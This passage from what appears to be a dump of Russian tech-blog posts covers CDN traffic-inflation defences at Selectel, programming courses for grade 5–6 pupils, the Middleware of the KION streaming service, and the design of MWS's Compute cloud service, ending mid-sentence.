клиенты спят. Запросы с подозрительных IP-адресов или географических регионов. Большое количество IP-адресов с неизвестным местоположением затрудняет отслеживание и блокировку.  Злоупотребление кэшированием. Злоумышленники могут обходить кэш-сервер CDN и увеличивать его нагрузку. Аномальные User-Agent или одинаковые заголовки у множества запросов. Фальшивые запросы маскируются под обычных пользователей, чтобы обходить фильтры и системы защиты.   User-Agent — это строка, которую браузер или другое клиентское приложение — например, мобильное, бот или скрипт — отправляет серверу в заголовке HTTP-запроса. Она содержит информацию об устройстве, операционной системе, браузере и его версии. Чтобы выглядеть как обычные пользователи, атакующие хосты используют разные User-Agent. Боты и злоумышленники могут маскироваться под обычные браузеры, чтобы обходить фильтры.  Как защитить ресурс от накрутки трафика Настройка лимитов и уведомлений В Selectel мы не отслеживаем клиентский трафик в реальном времени, потому его анализ и контроль находится в зоне ответственности самого клиента. Это связано с тем, что характер трафика может значительно различаться в зависимости от типа ресурса, аудитории и специфики использования CDN.  Однако внезапные скачки потребления трафика могут привести к неожиданным расходам, поэтому у нас предусмотрена настройка уведомлений, которые помогут клиенту своевременно реагировать на изменения нагрузки. Для этого необходимо перейти в панель управления, нажать на кнопку Помощь → Создать тикет. После — выбрать тему Услуги → CDN и указать в форме, при каком объеме потребленного трафика необходимо отправить уведомление.  Как это работает?   Вы можете задать пороговое значение трафика — например, 1 ТБ, 10 ТБ и т. д.  Когда потребление достигнет указанного уровня, система отправит вам уведомление.   Функция позволяет оперативно анализировать ситуацию и при необходимости принимать меры: проверить источник трафика, скорректировать настройки CDN или включить дополнительные механизмы защиты. Таким образом, мы предоставляем инструменты для контроля трафика, но ответственность за мониторинг и реакцию на аномальные изменения остается на стороне клиента.  Блокировка подозрительных IP-адресов и стран  В панели управления есть опция, которая позволяет ограничивать доступ к CDN-контенту по указанному списку IP-адресов. По умолчанию опция выключена, а доступ к контенту ресурса разрешен всем IP. Клиенты могут использовать эту функцию, чтобы повысить безопасность ресурса, снизить вероятность атак и эффективнее контролировать трафик.  Чтобы включить опцию, нужно перейти в раздел CDN-ресурсы → Настройки и выбрать пункт Политика доступа IP-адресов. Настроить можно как разрешающую политику, так и запрещающую — для этого достаточно ввести список IP-адресов.   Атаки на CDN могут исходить из любых стран, но есть регионы, откуда такие угрозы встречаются чаще. Они могут быть связаны с ботнетами, прокси-сетями, VPN, а также деятельностью злоумышленников. Настройка защиты по токену или заголовкам В панели управления доступна функция, которая защищает файлы от нежелательных загрузок. Опция позволяет сделать ссылки на контент временными и ограничить доступ по IP. Если мошенник будет использовать истекшую ссылку или запрашивать контент не с доверенного IP, то не сможет ничего загрузить.  Чтобы включить опцию, нужно выбрать пункт Доступ по ключу и сгенерировать ключ. По желанию можно добавить IP-адрес клиента к токену.    Настройка игнорирования параметров  Злоумышленники могут обходить кэш CDN и повышать нагрузку на Origin, добавляя к URL некорректные параметры. Каждый такой запрос CDN воспринимает как уникальный, поэтому отправляет его на Origin. В результате проблема приводит к росту трафика и увеличению расходов. Чтобы этого избежать, рекомендуем включить Игнорирование параметров запросов.    Игнорирование Set-Cookie при кэшировании  Set-Cookie — это HTTP-заголовок, который сервер отправляет в ответе, чтобы установить куки (cookies) в браузере пользователя. Куки — это небольшие фрагменты данных, которые хранятся на стороне клиента и используются для аутентификации, персонализации и хранения настроек.  Set-Cookie — полезный инструмент для аутентификации и персонализации трафика, но при некорректном использовании он может негативно повлиять на кэширование и производительность CDN.   По умолчанию CDN не кэширует файлы с заголовком Set-Cookie — предполагается, что они персонализированы. Если Set-Cookie используют для статических файлов, например image.jpg, то его можно игнорировать в CDN, чтобы кэшировать файлы и снизить нагрузку на Origin.  По умолчанию файлы с HTTP-заголовком Set-Cookie не кэшируются. В результате каждый новый запрос пользователя проксируется на Origin, а не отдается из кэша. Это снижает процент кэшированного трафика и увеличивает нагрузку на источник.  Если Origin-сервер добавляет Set-Cookie к статическим файлам, но сами файлы одинаковы для всех пользователей, опция поможет снизить нагрузку на Origin, уменьшить расход трафика и ускорить раздачу контента. Чтобы ее включить, нужно добавить галочку на пункт Игнорировать Set-Cookie.    Анализ логов CDN и выявление аномалий Анализ логов — один из самых эффективных способов обнаружения и предотвращения накрутки трафика. Логи позволяют увидеть реальные запросы, выявить подозрительную активность и вовремя принять меры, прежде чем накрутка приведет к росту расходов.   У нас в Selectel доступна опция автоматической выгрузки логов CDN-ресурсов в реальном времени. Логи содержат информацию о запросах пользователей, которые поступают на кэшируемые CDN-серверы и серверы предварительного кэширования. Их можно выгружать сразу в объектное хранилище Selectel или любое доступное хранилище — например, S3, FTP или SFTP.   Заключение Накрутка трафика через CDN — серьезная проблема, которая может привести к неконтролируемому росту расходов. Но если знать механизмы атак и использовать доступные инструменты защиты, то можно минимизировать эти риски. Использование описанных методов позволяет не только защититься от накрутки трафика, но и оптимизировать работу CDN, сократить нагрузку на сервер и снизить издержки."
27,Какие есть основы программирования для 5-6 класса: полный обзор вариантов + подборка,IT для детей,Компания,0,"Веб-разработка, Производство мультимедиа-контента, Игры и развлечения",2025-04-10,"Привет! Я Ксения – автор в блоге «IT для детей». Вместе с командой ведем его для родителей современных школьников, увлеченных компьютерами и играми. Стараемся подталкивать ребят к освоению полезных инструментов и обозреваем школы и курсы, где можно научиться писать код, выполнять game-проекты, создавать сайты и делать другие интересные вещи.В сегодняшней публикации расскажу о том, почему начать изучать программирование в 5–6-м классе – вполне нормальное решение, а также обозначу примеры инструментов, которые помогут вникнуть в основы. Дополнительно и по сложившейся традиции предложу примеры курсов, представлю небольшой раздел FAQ и дам ссылки на полезные тематические статьи.Почему результативное изучение основ программирования в 5–6-м классе – это реализуемоРанее писала о том, каковы особенности развития детей ближе к подростковому возрасту и в его ранней стадии. Повторяться и приводить ссылки на исследования не буду, коротко отмечу, что в рамках обозначенного периода:Протекает переход от детских ролей и детства в принципе к условной самостоятельности, что сопровождается стремлением к изучению чего-то нового;Становится активным процесс запоминания и усвоения информации, что плюс в контексте погружения в цифровые технологии на интерактивных уроках;Повышается тяга к самовыражению, в особенности нестандартными способами, в чем программирование и разработка игр заметно выигрывают перед классическими вариантами дополнительного обучения;Активизируется стремление к удовлетворению собственных потребностей в познании вне рамок относительных запретов, что связывается с т. н. подростковым противоречием. Если компьютер и игры увлекают, запись на курсы, скажем, разработки, станет отличным решением, ведь будет снят условный барьер в виде ограниченности того же познания школьной программой.С чем способен справиться ребенок в 10–12 лет: примеры задач и программ, которые помогут вникнуть в основы программирования учащемуся 5–6-го классаНачинать изучать программирование в 5–6-м классе можно с помощью визуально-блочных сред (наиболее простой вариант для новичков) или текстовых языков и вспомогательных инструментов. Привожу примеры программ:Godot Engine. Это игровой движок, с помощью которого можно создавать несложные 2Д- и 3Д-игры. Также функционал Godot позволяет писать код на языке GDScript. Это хороший вариант погружения в основы программирования для школьников;Scratch. Это наиболее простой вариант, ведь среда основана на написании кода блоками. Процесс напоминает сборку Lego, вместе с тем не стоит считать, что Скретч – несерьезный инструмент: его посредством можно организовать погружение в программирование и информатику в 6-м классе на примере создания простых игр, анимации и мультфильмов;Minecraft. Сразу отмечу, что данная вселенная часто используется как основа курсов внеурочного программирования на Python для учащихся 6-х классов. Язык относительно сложный, не спорю, но подоплека в виде возможности создавать моды для Майнкрафта вовлекает в учебный процесс, делает ребят заинтересованными в достижении результатов;Roblox Studio. Это движок, благодаря которому можно создавать игры для Роблокса – онлайн-платформы с многомиллионной аудиторией. Дополнительно Studio позволяет писать код на Lua, создавать модели, скриптить программную логику, заниматься проектированием игровых миров и реализацией их дизайна;Unity. Это еще один движок, предназначенный для выполнения game-проектов. Он несколько сложнее Роблокса, ведь функционал значительно шире, при этом предполагается использование языка C#.С чего начать погружение в основы программирования в 5–6-м классеЧасто пишу о том, какие языки программирования для детей и в каком порядке стоит изучать, поэтому данной теме уделю лишь поверхностное внимание. Так, если школьник пока не знает основ, не знаком с алгоритмами и прочими важными аспектами кода, начать лучше со Скретча. Может показаться, что это больше развлекательная среда, однако именно она поможет заложить основы.Уже дальше можно продвигаться в сторону более сложных вещей, скажем, Роблокса и Unity.Вывод простой: необходимо начинать изучать кодинг последовательно. Сразу записывать ребенка на курс Python, если до этого он использовал компьютер и прикладные программы только для развлекательных целей, не стоит: считаю подобные решения ошибочными. Развлечение или серьезное занятие: что дадут курсы или самостоятельные урокиЧасто сталкиваюсь с мнениями вроде того, что Скретч, Роблокс и другие обозначенные среды и инструменты носят больше развлекательный характер и интересуют детей только по той причине, что позволяют создавать игры и выполнять смежные проекты. Но уроки в любом случае обладают образовательным потенциалом. В узком смысле он выражается в:Формировании навыка программирования;Развитии дополнительных способностей вроде, скажем, создания игр;Появлении основ полезного хобби;Формировании понимания, что компьютер можно использовать с пользой.Вместе с тем активизируется развитие логического мышления, возникают прочие общие эффекты вроде оформления целеустремленности, способности раскладывать сложные цели на простые последовательные задачи и т. д. Отмечу и то, что учеба поможет подготовиться к получению профессионального образования в направлении программирования в будущем, если это заинтересует ребенка.Видно, таким образом, что внеурочная деятельность в частной школе – это полезное занятие, дающее ряд положительных результатов. А я хочу перейти к традиционной рубрике и представить несколько курсов, где удастся освоить написание кода с нуля.Примеры курсов программирования для детей 6-х классовСегодня решила отобрать курсы Скретча, ведь он больше подходит начинающим ребятам. Также отмечу, что по традиции отдала предпочтение онлайну и проанализировала представленные варианты по таким критериям:Цена;Форматы;Скидки;Примеры проектов, которые предстоит выполнить.Позаботилась о ссылках: если захочется узнать больше о конкретном курсе, вы сможете самостоятельно ознакомиться с соответствующей информацией.Scratch для детей: курс программирования для начинающих ребятЦена: 800 рублей за занятие в среднем.Форматы: группы, индивидуальные уроки, видеокурс.Скидки: 10 % для новичков, доступны дополнительные льготы для ребят из многодетных семей.Проекты: лабиринт, игровое меню, раннер, генератор предложений, викторина, мяч с ботом и т. д. Ссылка: https://pixel.study/scratchСкретч для детей и подростков: курс по программированию для 6-го классаЦена: от 1 000 рублей за урок.Форматы: индивидуальный и групповой.Скидки: нет информации.Проекты: симулятор сбора ягод, викторина, игра с условиями.Ссылка: https://skysmart.ru/programmirovanie-dlya-detej/scratchВведение в программирование на языке Scratch для 6-го классаЦена: минимум 950 рублей за занятие.Форматы: индивидуальные уроки.Скидки: неуточненная выгода предоставляется за оплату четырех занятий и более сразу.Проекты: заявлено, что будут выполнены некоторые игры и анимация.Ссылка: https://easypro.academy/courses/scratchОнлайн-курс программирования на Скретче для школьников 6-х классовЦена: от 8 долларов за онлайн-урок.Форматы: индивидуально-групповой, индивидуальный.Скидки: неуточненная выгода станет доступной при оплате расширенного пакета занятий.Проекты: анимация, несколько 3Д-игр.Ссылка: https://itgen.io/programmirovanie/scratchТак, с примерами все, но не прощаюсь и спешу отметить, что старт в разработке и программировании возможен как посредством Скретча, так и в альтернативных средах. 6-классникам подойдут Роблокс, «Юнити» и не только, но предпочитать сложные вещи стоит при условии, что есть базис в плане того, что ребенок понимает алгоритмы и другие принципы кодинга.Считаю, что здесь важно корректно выбрать основу: в таком случае ранний старт в программировании поможет добиться определенных успехов.FAQПо традиции представила мини-FAQ с распространенными вопросами по теме.Как выбрать курс по информатике и программированию для ребенка 12 лет?Уже отмечала, что важно отталкиваться от фактических способностей и навыков. Если в одном случае Скретч станет оптимальным вариантом, то в другом лучше сразу стартовать с помощью Роблокса.Еще подчеркну, что важно учитывать интересы ребенка. Есть вероятность, что кодинг не будет интересным в принципе, поэтому принимать решение стоит вместе со школьником.Действительно ли ранний старт – хорошее решение с точки зрения обучения программированию 6-классника?Да, считаю, что это так: обоснование привела ранее. Дополнительно отмечу, что программирование все чаще приравнивается ко второй грамотности, что является еще одним аргументов в пользу раннего старта.Есть ли учебники для самостоятельных занятий?В интернете есть множество обучающих материалов для самостоятельного старта, которые подойдут, если курсы не рассматриваются как способ организации обучения. Это видео, текстовые инструкции и даже полноценные книги, посвященные программированию и предназначенные для детей.Полезные тематические статьиВ завершение привожу ссылки на статьи, которые могут стать полезными. Вот они:Чем полезны курсы программирования для школьников 6-го класса? Что могут сделать дети в 12 лет + подборка онлайн-уроков;Как создавать в Роблоксе самому игры: мини-гайд и подборка курсов, где учат этому детей."
28,"Путь видео в онлайн-кинотеатрах от «стекла до стекла». Middleware — ядро, подписки, сервисы, витрина",МТС,Про жизнь и развитие в IT,0,"Связь и телекоммуникации, Мобильные технологии, Веб-сервисы",2025-04-10,"Привет, Хабр! Снова с вами Дмитрий Новожилов — техлид онлайн-кинотеатра KION. В прошлый раз я рассказал, откуда берется контент на киносервисах и как он обрабатывается. Для этого разобрал источники данных и элемент Headend, включающий пункт приема сигнала, кодер и пакетайзер.На предварительных этапах контент нормализуется, делится на чанки, обрабатывается DRM и попадает в «сердце видеосервиса» — Middleware. Это тот самый элемент, который управляет контентом, когда вы открываете приложение на умном телевизоре или смартфоне. Он обеспечивает логику работы витрины: когда вы заходите в сервис, показывает доступный на площадке контент. Затем вы выбираете нужный фильм и получаете его через ближайший узел CDN.В этом посте я расскажу, какие компоненты и сервисы объединяются термином Middleware и что конкретно делает этот комплекс.Обогащение контента метаинформациейМы рассмотрели, как контент (физические кадры видеоряда) преобразуется в финальную версию того, что в конечном итоге вы будете видеть на своем экране. В подавляющем большинстве платформ после кодера с видеопотоком (его качеством, разрешением, цветопередачей и так далее) уже ничего не происходит. Он не меняется: только преобразуется транспорт, как именно тот или иной кадр видео будет доставлен до вас. Если представить, что 1 секунда видео — это 24 кадра, а каждый кадр — это условно обычная статическая картинка, то вот с ней никаких изменений уже не происходит. Именно поэтому весь контент с Headend можно смело перекладывать на Origin, о котором расскажу в следующем тексте.Но сам по себе видеоряд неинформативен. Представьте, что вы пришли в кинотеатр, а там на афише увидели бы «Film_№1.mp4», «Film_№2.mp4». Совсем не понятно, что именно можно посмотреть, когда идет сеанс, сколько он стоит и так далее. Вот эта информация о контенте индустриальным языком называется метаданными. Их формирование идет параллельно загрузке самого видеоряда на платформу. И за работу с этим процессом уже отвечает Middleware.При публикации контента в Middleware к нему добавляется вся нужная информация. Если мы говорим про Video on Demand (фильмы, сериалы и так далее), то это будет название, краткое описание, длительность, состав актеров, режиссеров и даже рейтинг на разных платформах. Я уже не говорю, что добавятся трейлеры и большое количество постеров, баннеров, иконок и других статических изображений, нужных для удобной навигации в приложении. У Live TV (эфирных каналов) также большое количество постеров, баннеров, иконок и других статических изображений, которые будут отображаться в вашем приложении для удобной навигации. Если мы говорим про Live TV (эфирные каналы), то у них тоже есть описание и программа передач (ее еще называют EPG — Electronic Program Guide), которая может загружаться раз в неделю, а потом обновляться, если идут какие-то сдвиги в эфирной сетке.Обеспечение биллингаМетаинформация помогает понять, что это за фильм или серия и действительно ли стоит тратить на нее время. Но, как и в любом кинотеатре, перед просмотром вам нужно оплатить билет. Это одна из фундаментальных функций комплекса сервисов, которые я объединил в термин Middleware. Она выполняется в рамках Business Support System (BSS).BSS — индустриальное название большого и сложного сервиса, который отвечает за все связанное с бизнес-процессами — биллинг. Этот термин пришел из телекома: сначала он использовался в фиксированной (проводной) связи, затем пришел в мобильную, а потом стал использоваться в так называемых Valued Added Service (VAS), которые сейчас стали полноценными и независимыми ИТ-системами. К ним как раз и относятся онлайн-кинотеатры.Если не вдаваться глубоко в историю в этом месте, то кратко: BSS ориентирован именно на поддержку взаиморасчетов с клиентами. Как только вы зарегистрировались в онлайн-кинотеатре, к вам привязывается внутренний счет. Этот счет вы можете пополнять, и с него могут списываться средства за покупки. В терминах индустрии назовем их подписками. Есть более-менее стандартные варианты подписок, предоставляемых большинством кинотеатров: SVoD: (Subscription Video on Demand). Этот вариант предусматривает помесячную оплату. Есть также стандартные варианты с автоматическим продлением либо без него. Другими словами, BSS самостоятельно отслеживает даты подключений, продлевает вашу подписку и списывает при этом средства, если это нужно.AVoD: (Advertising Video on Demand). Этим, я уверен, пользовалось подавляющее большинство из вас. Вы смотрите контент бесплатно, но в начале или периодически в середине фильма вам включают рекламу, которую еще и нельзя пропустить. Это и есть AVoD-подписка. Платформа и создатели контента получают деньги с рекламодателей, а вы «платите» просмотром рекламы.Time-based Video on Demand (TVoD). Пользователь платит за аренду контента на определенный период. Например, можно в течение трех месяцев смотреть фильм сколько угодно раз, а потом он вновь становится недоступным.Electonic Sell Through (EST) или Download To Own (DTO). Пользователь платит один раз и имеет неограниченный доступ к контенту. Pay Per View (PPV). Это частный случай TVoD, который чаще всего применяется к передачам или эфирным каналам. Например, вы хотите посмотреть один футбольный матч в прямом эфире, но не собираетесь подписываться на спортивный канал по модели SVoD. Для таких бизнес-сценариев можно использовать PPV: вам будет открыт доступ к каналу только в определенное временное окно.FrontEndИтак, мы загрузили видеоряд, добавили ему описание и постеры, сформировали стоимость просмотра и возможность это оплатить. Но теперь нам надо дать возможность клиенту этим всем воспользоваться. И вот тут в процесс вступает другая часть платформы Middleware — FrontEnd. Это тот комплекс, который непосредственно взаимодействует с вашим приложением на телефоне или телевизоре.Тут я хочу подчеркнуть масштаб этого комплекса: представьте, что у нас миллионы пользователей одновременно находятся в своих приложениях и что-то листают, читают, просматривают. Эти запросы должны кем-то приниматься и обрабатываться настолько быстро, насколько это вообще возможно. Есть метрики, которые показывают, что задержки ответа от FrontEnd клиенту уже вызывают негатив. В терминах индустрии — создают Bad UX. Такие запросы обычно весят мало — это не видеопоток, где данные нельзя сжать, поэтому они и исчисляются в терабитах в секунду. Зато они выделяются своей частотой — это десятки тысяч RPS (Request per second).Один из важных самых важных FrontEnd-сервисов — это витрина. Как только вы авторизовались в приложении (а в большинстве случаев даже до авторизации), можете просматривать информацию о всем доступном контенте. Видеть постеры, читать описание, смотреть трейлеры. Почти вся функциональность витрины будет открыта даже без оплаты.Одна из отдельных функций витрины — это система рекомендаций. Да, саму подборку рекомендаций для вас производит другой модуль Middleware — BigData (возможно даже с участием AI) на основе большого числа метрик, но отображает на вашем устройстве результат именно витрина.Но и это еще не все. При регистрации (а чаще даже ранее, при запуске приложения) вы проходите три стадии, которые объединяют индустриальным термином AAA или «ТриплЭй»:Аутентификацию: ответ на вопрос «Кто именно хочет воспользоваться сервисом?». Упрощенно это ввод логина и пароля, по которым система идентифицирует вас как уникального пользователя.Авторизацию: ответ на вопрос «К чему есть доступ у этого пользователя?». В вашем аккаунте будут представлены сервисы которые, например, вы уже оплатили. Или доступные только на вашем устройстве или в вашем регионе. Аккаунтинг: ответ на вопрос «Что именно вы сейчас делаете в сервисе?». В нашем случае это можно сопоставить с отслеживанием доступности тех или иных функций в каждый момент времени.На этом этапе во всех системах Middleware создаются записи про ваш аккаунт, устройство входа, оформленные подписки. Это позволяет вам пользоваться сервисом не с одного устройства, а бесшовно пользоваться любым парком устройств. Например, вы можете дома, через ваш smart-телевизор подписаться и запустить понравившийся вам фильм, потом перейти в другую комнату и продолжить просмотр на другом устройстве, например, через ноутбук, и с того момента, где вы остановились ранее.Все подписки будут привязаны к вашему аккаунту, а ваш аккаунт — ко всем устройствам. И тут хотел бы затронуть тему Terminal Management System (TMS) — еще одного важного элемента Middleware, который не всегда существует в явном виде. У него много функций: например, через него вы можете отправить подробную информацию о каком-либо сбое приложения. Этих данных будет достаточно, чтобы найти и исправить ошибку. Этот сервис также может отвечать за количество устройств, которые вы можете одновременно использовать. Например, некоторые правообладатели требуют, чтобы один и тот же контент нельзя было смотреть параллельно более чем на 2–5 устройствах у одного пользователя. И так далее. Ну и мы плавно перешли к еще одной составляющей MiddleWare — Operation Support System (OSS).Функции OSSOSS — это такой же большой и сложный комплекс, как и BSS. Я перечислю только основные:Мониторинг всех систем онлайн-кинотеатра. Предоставление инструментов для выявления и исправления любых сбоев. Отображение отчетов с огромным количеством разных метрик. Они дают множество возможностей для обслуживания платформы и позволяют следить за доступностью системы. Трассировка. Она может присутствовать не у всех кинотеатров, но ее надо озвучить. Если пользователь столкнулся с проблемой при работе онлайн-кинотеатра, то ему не обязательно обращаться в техническую поддержку. В отчетах будет выстроена последовательность всех действий, которые привели к ошибке, и найти причину уже не так сложно. На всякий случай подчеркну, что все персональные данные в подобного рода системах защищены. Инженеры технической поддержки оперируют, скорее, некими идентификаторами. Им не нужно знать ваше имя чтоб решить проблему — они будут работать с уникальным набором символов, который позволяет отследить все действия. Связать этот идентификатор именно с вами нельзя без наивысшего уровня доступа, сопоставимого с банковской сферой.На этом у меня пока все. В Middleware может входить еще много разных систем которые предоставляют функциональность как конечному клиенту, так и сотрудникам платформы. Я постарался перечислить самые основные, но за кадром остается еще много интересного: например, системы поиска, работы с рекламными акциями или профилирования, когда под вашим аккаунтом может зайти ребенок и для него будет доступен только детский контент. Все это — часть Middleware как того главного элемента, который отвечает за предоставление услуг онлайн-кинотеатра.В следующей части я расскажу дальше про прохождение видеопотока, который после пакетайзера попадает на Origin. Готов ответить на все возникшие вопросы в комментариях. Хорошего дня!"
29,"Декларативный API, деревья поведений и реконсиляция: как мы в MWS строим сервис Compute",MWS,"Больше, чем облако",0,"Аппаратное обеспечение, Связь и телекоммуникации, Домены и хостинг",2025-04-10,"Приветствую всех! На связи Родион Цалкин, Tech Product IaaS в MWS. В этой статье расскажу, из каких решений на верхнем уровне состоит сердце MWS — сервис вычислительных ресурсов Compute — и как знания из разных областей помогают найти элегантные решения для возникающих проблем при его создании. Здесь не будет технического deep-dive’а (ждите в следующих материалах), поэтому статья будет интересна широкому кругу читателей.Чтобы рассказать об этих решениях, надо для начала слегка погрузиться в то, какие задачи решает сервис Compute, как с ним взаимодействует пользователь и как вообще работает.За что отвечает Compute в облаке?  Основная цель облачной платформы в целом и сервиса Compute в частности — обеспечить пользователя гибкими и масштабируемыми вычислительными ресурсами без необходимости приобретать и поддерживать физическое оборудование.С технической точки зрения задача Compute заключается в создании и управлении виртуальными вычислительными ресурсами — запуске виртуальной машины, подключении дисков и сетевых адаптеров.Однако лишь создания виртуальной машины недостаточно — пользователю нужна возможность менять конфигурации на любом этапе жизненного цикла, например увеличить размер диска без перезагрузки, изменить количество ядер или оперативной памяти.Подобные возможности нужны не только клиентам, есть и внутренние пользователи. На основе виртуальных машин создаются платформенные сервисы (Platform-аs-а-Service), такие как Managed Kubernetes, DBaaS и другие. Все они функционируют на виртуальных машинах, поэтому сервис Compute, объединяющий виртуальную машину, сеть и диск, является центральным компонентом облачной инфраструктуры.Как пользователь взаимодействует с облачной инфраструктурой  Пользователь должен сообщить Compute, какую виртуальную инфраструктуру он хочет. Есть несколько способов это сделать.Исторически первый способ — это обращение в службу поддержки с запросом на создание виртуальных машин в облаке... Сейчас это, скорее, атавизм, но в некоторых облаках всё еще встречается.Второй путь гораздо более технологичный — пользователь сам создаёт нужную виртуальную инфраструктуру через пользовательский интерфейс (UI) либо использует утилиту командной строки или программный вызов API. Для одной виртуальной машины такой подход вполне логичен и удобен.Самые продвинутые с инженерной точки зрения клиенты используют подход Infrastructure as Code, который позволяет описывать инфраструктуру непосредственно в коде, используя все преимущества такого подхода: возможность версионирования, повторного использования и параметризации. Например, если клиент научился с помощью Infrastructure as Code создавать необходимые виртуальные машины в одной зоне доступности, он может, используя тот же код, создать вторую зону, изменив параметры зоны доступности, — и вся инфраструктура будет развёрнута автоматически.Для того чтобы обеспечить пользователю удобство работы в подходе Infrastructure as Code, мы в MWS решили строить свой API по декларативной модели. Это значит, что вместо описания последовательности действий по созданию инфраструктуры и облачного окружения (императивный метод) задаётся конечное (желаемое) состояние системы.Например, вместо пошагового описания действий типа: «Запусти виртуальную машину, подключи диск, подключи сеть», мы говорим: «Должна существовать виртуальная машина с определённым диском и сетью». Разница в том, что во втором подходе система ничего не будет делать, если всё уже сделано, — декларативная модель изначально идемпотентна. А в первом подходе, если ID, скажем, генерируется на стороне сервера, можно случайно запустить вторую виртуалку — и за обеспечение идемпотентности придётся отвечать уже клиенту.Как мы создаём виртуальные машины   Итак, мы обсудили, как пользователь передаёт системе желаемое состояние — теперь посмотрим, как на основе этого описания создаются виртуальные машины с нужной сетью и дисками. Что происходит под капотом?  Архитектура инфраструктурного слоя облака MWS  Глобальный и зональный Control Plane  Зона — это, по сути, дата-центр. Если зона выходит из строя, а информация о размещённых в ней ресурсах хранится только внутри неё, то пользователь в случае аварии не сможет увидеть, что у него там было, — эти виртуальные машины просто исчезнут из UI до восстановления зоны.Чтобы избежать таких ситуаций и обеспечить независимость зон при одновременном сохранении глобальной видимости ресурсов, мы разделили наш Control Plane на два слоя: глобальный и зональный. Внутри дата-центра работает часть сервиса, которая может действовать автономно — даже при отказе каналов связи с центральной системой. А глобальный слой, в свою очередь, обеспечивает кросс-зональную консистентность и управляемость.Есть ещё один интересный аспект разделения на глобальный и зональный слои — они отвечают за разные типы сущностей: логические и физические.В процессе управления облачной инфраструктурой мы имеем дело как с логическими (виртуальными), так и с физическими объектами. Например, когда пользователь создаёт виртуальный диск, это не означает, что где-то немедленно появляется конкретное физическое устройство. А вот внешний IP-адрес — это одновременно и логическая сущность, и реальная, поскольку он должен быть связан с конкретным интерфейсом.А что насчёт виртуальной машины? Это логическая сущность. Хотя с точки зрения пользователя существует одна ВМ, физически она может быть реализована несколькими процессами — особенно в момент live-миграции, когда временно сосуществуют два физических экземпляра одной и той же виртуалки.Это разделение отражается в архитектуре нашей системы: глобальный слой управляет логическими сущностями — тем, что «видит» пользователь, а зональный — отвечает за их физическую реализацию.На практике это выглядит так: на глобальном уровне происходит связывание виртуальной машины с IP-адресом и диском, а на зональном выполняется конкретная работа — выбор физического сервера для размещения ВМ, создание экземпляра ВМ, подключение к нужному сетевому адаптеру и монтирование нужного диска.Чтобы преобразовать логическое описание пользователя в работающую физическую инфраструктуру, системе необходимо выполнить целый комплекс действий — от анализа доступных ресурсов до настройки компонентов гипервизора. Здесь возникает ключевая задача: как эффективно согласовать желаемое состояние, заданное пользователем, с текущим состоянием системы, учитывая множество зависимостей и возможных сценариев выполнения? Это приводит нас к самому интересному компоненту системы — механизму реконсиляции, который определяет всю логику работы Compute.Для превращения глобальных сущностей в зональные требуется выполнить определённые сценарии, которые бывают достаточно сложны. Получается довольно длинная вводная в ту проблему, о которой я хотел рассказать, и это первое упоминание сути — нужно описать сложный сценарий.Но для понимания надо идти дальше, we need to go deeper…Data Plane   После определения логической структуры и планирования физической реализации на зональном уровне, необходимо применить эти изменения в инфраструктуре. Эту задачу выполняет уровень Data Plane (DPL), который работает непосредственно на хостах, где развёртываются виртуальные машины. Именно здесь абстрактные инструкции превращаются в конкретные команды для гипервизора, сетевых компонентов и систем хранения данных.На базовом уровне технологии сборки виртуальной машины мы используем гипервизор QEMU-KVM, который взаимодействует с виртуализированной сетью и дисками через протокол vhost. Для оптимизации производительности применяются специализированные библиотеки: SPDK (Storage Performance Development Kit) для работы с дисками и DPDK (Data Plane Development Kit) для сетевого взаимодействия.Управление этими компонентами происходит по той же декларативной модели, которая пронизывает всю архитектуру Compute. Информация о желаемой конфигурации передаётся сверху вниз по цепочке: пользователь декларативно описывает требуемый результат глобальному слою, глобальный передаёт необходимые инструкции зональному, а зональный — уровню Data Plane. Получив эти инструкции, DPL анализирует текущее состояние хоста и определяет последовательность действий, необходимых для достижения целевой конфигурации.И наконец-то, мы дошли до проблемы!Проблемы с логикой реконсиляции  Ключевая задача Compute — создавать виртуальные машины согласно требованиям пользователей, преобразуя декларативные запросы в конкретные действия системы. Однако между описанием желаемого состояния и его реализацией лежит сложный процесс реконсиляции.Реконсиляция (термин, пришедший из финансового контроля) — это процесс согласования текущего состояния системы с желаемым через определение оптимальной последовательности действий. Именно благодаря реконсиляции пользователи могут работать на высоком уровне абстракции, описывая конечный результат, а не шаги для его достижения.Если хотите нырнуть глубже в процесс реконсиляции — читайте статью Сергея Самойлова о механизме реконсиляции на примере block devices.Почему этот подход так важен? Есть несколько причин:Гибкость системы. Например, если пользователь в процессе создания ВМ решает изменить конфигурацию с 4 на 8 ядер, система должна адаптироваться — либо внести изменения до запуска машины, либо реализовать их через hot-plug после запуска.Адаптация к ограничениям ресурсов. Некоторые запросы могут быть временно невыполнимы — например, запрос на spot-инстанс при нехватке ресурсов. Благодаря реконсиляции пользователь может изменить тип размещения со spot на on-demand без удаления и пересоздания всей ВМ.Оптимизация производительности. Немедленное исполнение каждой декларации пользователя может снизить отзывчивость системы, поэтому умная реконсиляция позволяет группировать изменения и выполнять их оптимально.Однако реализация такой логики чрезвычайно сложна. Она требует обработки множества условий: проверки текущего состояния ВМ, параметров дисков, необходимости перезапуска, зависимостей между компонентами и множества других факторов. Дополнительную сложность создают возможные сбои инфраструктуры и релизы новых версий самого Compute во время выполнения операций.Существует несколько традиционных подходов к реализации логики реконсиляции, но все они имеют существенные недостатки:Императивный подход со множеством условных операторов. Такой код быстро превращается в неподдерживаемые «спагетти» — когда логические ветвления настолько переплетаются, что становится невозможно отследить все сценарии выполнения.Конечные автоматы, которые, несмотря на более формальную структуру, также приводят к чрезмерной сложности. Даже опытным разработчикам требуется значительное время для понимания такого кода, а внесение изменений становится настоящим испытанием.Оба этих подхода оказываются неэффективными для быстрой разработки и долгосрочной поддержки системы.Как нам помог опыт геймдева и робототехники  Мы провели исследование и обнаружили, что подобная задача написания логики, которая сильно зависит от множества признаков о состоянии окружения, встречается в робототехнике и разработке игр. В робототехнике промышленные роботы часто выглядят так, будто действительно думают — они оценивают ситуацию и принимают решения, которые кажутся осмысленными. Однако за этим стоит не искусственный интеллект, а детерминированный алгоритм, чётко прописанный сценарий действий в зависимости от внешних условий.Схожая ситуация наблюдается и в разработке игр. Игрок постоянно изменяет виртуальное окружение — открывает двери, перемещает предметы, блокирует проходы. При этом неигровые персонажи должны адекватно реагировать на все эти изменения: находить обходные пути вместо столкновения с препятствиями, не пытаться открыть уже открытую дверь и в целом демонстрировать поведение, которое выглядит осмысленным в любых обстоятельствах.Подход «Деревья поведений»  Дерево поведений — это особый способ организации конечных автоматов (finite state machines), который значительно упрощает их восприятие. В отличие от стандартных подходов, логику, выраженную через деревья 